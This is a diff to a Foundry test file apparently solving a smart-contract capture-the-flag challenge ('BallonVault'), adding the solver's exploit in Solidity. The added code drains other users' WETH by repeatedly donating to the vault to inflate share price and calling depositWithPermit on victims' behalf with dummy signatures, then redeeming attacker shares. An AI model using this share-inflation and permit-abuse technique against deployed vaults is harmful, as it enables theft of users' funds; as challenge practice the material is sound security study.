@@ -11,8 +11,6 @@ import {BallonVault} from "../src/5_balloon-vault/Vault.sol";
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
-
-
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
 ////////////////////////////////////////////////////////////*/
@@ -49,9 +47,48 @@ contract Challenge5Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge5Test -vvvv //
         ////////////////////////////////////////////////////*/
+        weth.deposit{value: 10 ether}();
 
+        weth.approve(address(vault), 1000 ether);
 
+        while (weth.balanceOf(address(alice)) > 0) {
+            uint256 attackerShares = vault.deposit(1, address(attacker));
+            console.log("attackerShares", attackerShares);
 
+            // weth.transfer(address(vault), 1 ether);
+            uint256 attackerBalance = weth.balanceOf(address(attacker));
+            uint256 aliceBalance = weth.balanceOf(address(alice));
+
+            uint256 load = aliceBalance < attackerBalance ? aliceBalance : attackerBalance;
+            console.logUint(load);
+            weth.transfer(address(vault), load);
+            vault.depositWithPermit(address(alice), load, block.timestamp + 1 days, 0, "0", "0");
+
+            uint256 attackerBalanceInVault = vault.balanceOf(address(attacker));
+            uint256 aliceBalanceInVault = vault.balanceOf(address(alice));
+            console.log("***********************", weth.balanceOf(address(vault)));
+            // weth.withdraw(load);
+            // vault.withdraw(attackerBalanceInVault, address(attacker), address(attacker));
+            vault.redeem(attackerShares, address(attacker), address(attacker));
+
+            attackerBalance = weth.balanceOf(address(attacker));
+        }
+
+        uint256 attackerShares = vault.deposit(1, address(attacker));
+
+        weth.transfer(address(vault), 500 ether);
+        vault.depositWithPermit(address(bob), 500 ether, block.timestamp + 1 days, 0, "0", "0");
+
+        vault.redeem(attackerShares, address(attacker), address(attacker));
+
+        // vault.depositWithPermit(address(alice), 500 ether , block.timestamp + 1 days, 0, '0', '0');
+        // vault.depositWithPermit(address(bob), 500 ether , block.timestamp + 1 days, 0, '0', '0');
+        // vault.withdraw(50 ether,   address(alice),address(attacker));
+        // console.log(block.timestamp);
+        // console.log(block.timestamp + 1 days);
+
+        // vault.transferFrom(address(alice), address(attacker), 500 ether);
+        // weth.safeTransferFrom(address(alice), address(attacker),500 ether);
 
         //==================================================//
         vm.stopPrank();
